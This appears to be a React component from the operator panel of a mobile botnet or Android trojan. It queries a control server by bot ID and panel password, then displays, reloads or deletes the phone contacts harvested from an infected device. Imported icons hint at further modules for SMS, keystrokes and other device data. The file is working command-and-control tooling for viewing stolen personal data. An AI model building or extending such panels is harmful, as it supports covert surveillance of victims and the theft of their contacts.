import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, Switch, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faUsers } from '@fortawesome/free-solid-svg-icons';
import countryData from './countrydata.json';
import { borderRadius } from '@mui/system';


export default function ContactPopup(props) {


    const { customer, title, children, openPopup, setOpenPopup, onClose, contactrequest, setcontactrequest} = props;


    const [list, setList] = useState([]);

    var requestdone = false
    const buttoncolor = "primary.main"

    const rootStyle = {
        display: 'flex',
        flexDirection: 'column',
        padding: '25px',
    };

    const smallBoxStyle = {
        marginBottom: '25px'
    };

    const tworoundstyle = {
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
    };

      const getLogs = async () => {
        let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
              'params':  new Buffer ('{"request":"getlogsPhoneNumber","idbot":"' + customer.id + '","password":"' + SettingsContext.password + ' "}').toString('base64')
          }
        });
    
        request.done(function(msg) {
          let response = (JSON.parse(msg))
          
          setList(response)
          
        }.bind(this));
    
        
      };

      const deleteLogs = async () => {
        let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
              'params':  new Buffer ('{"request":"deletelogsPhoneNumber","idbot":"' + customer.id + '"}').toString('base64')
          }
        });

        setList([])
        
      };

      if (openPopup && !contactrequest) {
        getLogs()
        setcontactrequest(true)
      }



    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>
                    <Box
                    bgcolor={buttoncolor}
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <UserIcon width={20} height={23}/> 
                        </SvgIcon>
                        <Typography ml={0.5}>{customer.id}</Typography>
                        
                    </Box>

                    <Box
                    bgcolor={buttoncolor}
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={180}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faUsers}/>
                        </SvgIcon>
                        <Typography ml={1}>Contacts</Typography>
                        
                    </Box>
                    
                    <Button
                    onClick={getLogs}
                      sx={{borderRadius: "10px"}}
                      startIcon={(
                        <FontAwesomeIcon icon={faArrowsRotate} />
                      )}
                      variant="contained"
                    >
                      Reload
                    </Button>

                    <Button
                    onClick={deleteLogs}
                    disabled={SettingsContext.user.role === "user"}
                    sx={{borderRadius: "10px", marginLeft: "15px"}}
                      startIcon={(
                        <FontAwesomeIcon icon={faTrashCan} />
                      )}
                      variant="contained"
                    >
                      Delete All Contacts
                    </Button>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x" color={buttoncolor}/>
                    </Button>
                    </div>
                    {list.length > 0 ? (
                    <List>
                    {list.map((item, index) => (
                        <ListItem key={item}>
                        <ListItemAvatar>
                            <Avatar><FontAwesomeIcon icon={faUser} size="2x"/></Avatar>
                        </ListItemAvatar>
                        <ListItemText primary={atob(item)} secondary={""} />
                        </ListItem>
                    ))}
                    </List>
                    ) : (
                        <p>No data avaliable.</p>
                    )}

            </DialogContent>
        </Dialog>
    )
}
